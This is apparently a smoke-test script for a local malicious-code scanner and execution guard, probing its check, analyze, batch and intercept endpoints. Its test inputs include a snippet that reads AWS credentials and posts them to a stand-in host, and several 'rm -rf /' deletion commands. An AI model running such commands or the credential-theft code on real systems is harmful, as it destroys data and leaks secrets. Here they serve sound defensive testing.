import json, time, urllib.request, urllib.error

base = 'http://127.0.0.1:8011'

def post(path, payload=None, raw=None):
    data = raw if raw is not None else json.dumps(payload).encode()
    req = urllib.request.Request(base + path, data=data,
                                 headers={'Content-Type': 'application/json'})
    try:
        r = urllib.request.urlopen(req, timeout=15)
        return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:200]

# wait for startup
health = None
for _ in range(40):
    try:
        r = urllib.request.urlopen(base + '/health', timeout=2)
        health = (r.status, json.loads(r.read()))
        break
    except Exception:
        time.sleep(1)

print('HEALTH', health)

mal = ('import os, requests\n'
       'creds = open(os.path.expanduser("~/.aws/credentials")).read()\n'
       'requests.post("http://example.invalid/collect", data=creds)')
print('CHECK malicious', post('/check', {'code': mal}))
print('CHECK benign   ', post('/check', {'code': 'import sqlite3\n'
      'def d(conn,i):\n    conn.execute("DELETE FROM orders WHERE id=?", (i,))'}))
print('CHECK empty    ', post('/check', {'code': ''}))
print('CHECK malformed', post('/check', raw=b'not json'))
print('CHECK no-body  ', post('/check', raw=b''))
big = post('/check', {'code': 'x=1\n' * 300000})[1]
print('CHECK huge verdict', big.get('verdict'), 'lines', len(big.get('vulnerable_lines', [])))

st, an = post('/analyze', {'code': 'import os; os.system("rm -rf /tmp/x")'})
print('ANALYZE status', st, 'keys', sorted(an.keys()))
print('  layers', an.get('deobfuscation_layers'), 'ml_ran', an.get('ml_ran'))
print('  timings', an.get('timings_ms'))
print('  evidence0', an.get('evidence', [{}])[0] if an.get('evidence') else None)

print('BATCH snippets', post('/batch', {'snippets': [{'id': 'a', 'code': 'rm -rf /'}, 'print(1)']}))
print('BATCH barelist', post('/batch', [{'id': 'z', 'code': 'print(2)'}]))
print('BATCH dictcode', post('/batch', {'code': 'print(3)'}))
print('BATCH bad      ', post('/batch', raw=b'not json'))

st, h = post('/demo/intercept', raw=b'')
print('INTERCEPT', st, h)

# guard API smoke test
import sys
sys.path.insert(0, '.')
from codeguard.guard import check, guarded, safe_exec, BlockedByCodeGuard
print('GUARD check', check('rm -rf /')['verdict'])
try:
    safe_exec('import os; os.system("rm -rf /")')
    print('GUARD safe_exec DID NOT BLOCK (BAD)')
except BlockedByCodeGuard as e:
    print('GUARD safe_exec blocked OK:', str(e)[:60])
